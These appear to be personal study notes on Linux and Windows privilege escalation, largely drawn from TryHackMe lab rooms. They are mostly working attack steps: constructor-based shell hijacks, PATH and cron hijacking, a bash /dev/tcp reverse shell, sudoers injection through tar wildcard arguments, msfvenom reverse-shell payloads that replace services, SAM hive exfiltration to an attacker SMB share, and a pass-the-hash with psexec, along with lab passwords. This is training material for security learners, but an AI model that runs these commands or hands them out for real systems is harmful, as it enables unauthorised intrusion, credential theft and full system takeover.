#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack(){
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

sudo LD_LIBRARY_PATH=/tmp apache2

-=-=-=
SUID/SGID Executables 

SUID Bit - Files: User executes the file with permissions of the file owner // Directories: -
SGID Bit - Files: User executes the file with the permission of the group owner. // Directories: File created in directory gets the same group owner.
Sticky Bit - Files: No meaning	//Directories: Users are prevented from deleting files from other users.

#One way is doing a strings in a file and checking if is not full path. In that case, using curl as an example
  echo /bin/sh > curl
  chmod 777 curl
  [change PATH]
  [run binary]

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

#Shared object Injection
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkidr /home/user/.config
gcc -share -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

-=-=-=-=
Privilege escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled Capabilities. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

getcap -r / 2>/dev/null

=-=-=-=
PATH  

We could use this script:
#include <unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("thm");
}

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit
  gcc path_exp.c -o path -w
  chmod u+s path

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command
find / -writable 2>/dev/null | cut -d"/" -f 2,3 | sort -u

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.
  export PATH=/tmp:$PATH

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

-=-=-=-=
Network File Sharing

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
  showmount -e 10.10.45.161

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
#In our machine 
  mkdir /tmp/loquesea 
  mount -o rw 10.10.45.161:/<el share> /tmp/loquesea

#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

-=-=-=-=
9.SSH
SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

    ssh -L 80:intra.example.com:80 gw.example.com 
    ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com

The same as listening but with socat 
./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &

-=-=-=-=
lxd
Able to deploy docker
 - searchsploit lxd 
 - check linux version. If 32 bits: ./build-alpine -a i686
 - transfer files to victim machine 
 - lxd_privesc.sh -f *.tar.gz 
 - If "This mus be run as root"
 - lxc image list # Imagen ya creada

#Troubleshooting
1.) Run this command in your home directory - git clone https://github.com/saghul/lxd-alpine-builder.git
2.) Then this - sudo ./build-alpine
3.) If above command run properly without errors then congrats!
4.) If not maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
5.) Goto - cd/rootfs/usr/share/alpine-mirrors/Mirrors.txt
6.) Open that .txt file with any editor and remove all the mirror sites except first one, then save it there only.
7.) Again run - sudo ./build-alpine


-=-=-=-=
Passwords & keys 
cat ~/.*history | less
ls -la /

-=-=-=-=-=-=-=
/etc/passwd
    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

If we can write on it:
  Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]

/usr/bin/vi with sudo -l ==> sudo vi ==> :!sh

-=-=-=-=-
Crontabs
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.



cat /etc/crontab

bash -i >& /dev/tcp/<IP>/4126 0>&1

other file to create

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p

#another example
The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job

#other example with this backup.sh
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1

#With wildcards
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf #In our host. SCP to the other machine 
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
-=-=-=-=-

Windows privilege escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.Harvesting passwords from usual spots

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
tasklist /svc | findstr /i windowsscheduler
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

#Cleartext passwords 
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe


IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#Another way 
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force


Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

How to know if it has bitlocker enabled
#bitlocker 

get-bitlockervolume
manage-bde -status



        

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.87.69 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

-=-=-=-
Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:

Command Prompt

C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

        

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

Service DACL

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

Service registry entries

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
Command Prompt

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

        

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:
Command Prompt

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

        

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        

We can then pull the payload from Powershell with the following command:
Powershell

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

        

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
Command Prompt

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

        

We start a reverse listener on our attacker machine:
Kali Linux

user@attackerpc$ nc -lvp 4445

        

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler

        

Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1

        

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:
Command Prompt

C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

        

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

        

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

        

Once the service gets restarted, your payload should execute:
Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"

        

As a result, you'll get a reverse shell with svcusr2 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2

        

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
Command Prompt

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

        

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

        

We will then transfer the reverse shell executable to the target machine and store it in C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
Command Prompt

C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

        

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
Command Prompt

C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

        

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
Command Prompt

C:\> sc stop THMService
C:\> sc start THMService

        

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM

-=-=-=
Abusing dangerous privileges
Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.


SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

        

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

        

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


        

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.199.94
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        


SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

        

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

